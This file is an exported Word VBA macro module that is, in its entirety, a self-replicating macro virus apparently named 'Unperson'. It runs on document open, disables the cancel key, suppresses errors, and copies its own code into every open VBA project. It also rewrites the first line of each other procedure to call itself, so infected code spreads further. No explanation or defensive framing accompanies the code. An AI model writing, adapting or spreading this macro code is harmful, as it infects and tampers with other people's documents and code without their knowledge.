VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Function IT()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Set A = VBE.SelectedVBComponent.CodeModule
B = A.Lines(A.ProcStartLine("IT", vbext_pk_Proc), A.ProcCountLines("IT", vbext_pk_Proc))
For c = 1 To VBE.VBProjects.Count
For D = 1 To VBE.VBProjects(c).VBComponents.Count
Set E = VBE.VBProjects(c).VBComponents(D).CodeModule
F = ""
F = E.Lines(E.ProcStartLine("IT", vbext_pk_Proc), E.ProcCountLines("IT", vbext_pk_Proc))
If E.CountOfLines > 2 And F <> B Then E.AddFromString B
For G = 1 To E.CountOfLines
H = E.ProcOfLine(G, 1)
If I <> H And H <> "IT" And Right(E.Lines(E.ProcStartLine(H, vbext_pk_Proc), 1), 4) <> ": IT" Then
E.ReplaceLine E.ProcStartLine(H, vbext_pk_Proc), E.Lines(E.ProcStartLine(H, vbext_pk_Proc), 1) & ": IT"
I = H
End If
Next
Next
Next
End Function
Private Sub Document_Open(): IT
'My_Creator = Lys Kovick
'My_Name = Unperson
'My_Comments = Do Not Distribute!
End Sub
